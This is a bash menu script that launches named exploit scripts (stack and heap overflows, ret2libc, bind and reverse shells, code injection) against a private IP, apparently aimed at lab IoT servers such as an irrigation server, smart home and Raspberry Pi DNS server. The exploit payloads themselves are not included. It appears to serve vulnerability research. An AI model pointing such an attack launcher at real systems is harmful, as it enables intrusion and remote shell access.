Attack()
{
	while true
	do
		echo ""
		echo "Please choose a particular attack..."
        	echo "	Stack overflow --> 1"
        	echo "	Ret2libc --> 2"
        	echo "	Heap overflow --> 3"
		echo "	Stack overflow (bind shell) --> 4"
		echo "	Heap Overflow (bind shell) --> 5"
		echo "	Stack overflow (reverse shell) --> 6"
		echo "	Heap Overflow (reverse shell) --> 7"
		echo "	Code injection attack --> 8"
		echo "	Select new server --> 9"

       		read input
        	case $input in
                	1) 
                        	$1/so.py "192.168.1.4" 5555
                       		;;
               		2) 
                       		$1/ret_2_libc.py "192.168.1.4" 5555
                       		;;
               		3) 
                       		$1/ho.py "192.168.1.4" 5555
                      		;;
			4)
				$1/so_bind.py "192.168.1.4" 5555
				;;
			5)
				$1/ho_bind.py "192.168.1.4" 5555
				;;
			6)
				$1/so_rev.py "192.168.1.4" 5555
				;;
			7)
				$1/rev_ret2libc.py "192.168.1.4" 5555
				;;
			8)
				$1/injecting_code.py "192.168.1.4" 5555
				;;
			9)
				return
				;;
               		*) 
        			echo "Please choose a particular attack..."
       			 	echo "	Stack overflow --> 1"
	        		echo "	Ret2libc --> 2"
        			echo "	Heap overflow --> 3"
				echo "	Stack overflow (bind shell) --> 4"
				echo "	Heap Overflow (bind shell) --> 5"
				echo "	Stack overflow (reverse shell) --> 6"
				echo "	Heap Overflow (reverse shell) --> 7"
				echo "	Code injection attack --> 8"
				echo "	Select new server --> 9"
				;;
       		esac
	done
}



while true
do
	echo "Please, choose a particular Server to EXPLOIT..."
        echo "	Irrigation Server --> 1"
        echo "	Smart Home --> 2"
	echo "	Remote Control Car Monitor --> 3"
	echo "	DNS server --> 4"
	echo "	exit from program -> 5"

	read program
	case $program in
		1)
			Attack ./IrrigationServer 
			;;

		2)
                	Attack ./smarthome
                	;;
		
		3)
                	Attack ./remote-control-monitor-car-server/src
                	;;
		4)
			Attack ./DNS_server_raspberrypi
			;;
		5)
			exit 1
			;;

	esac
done
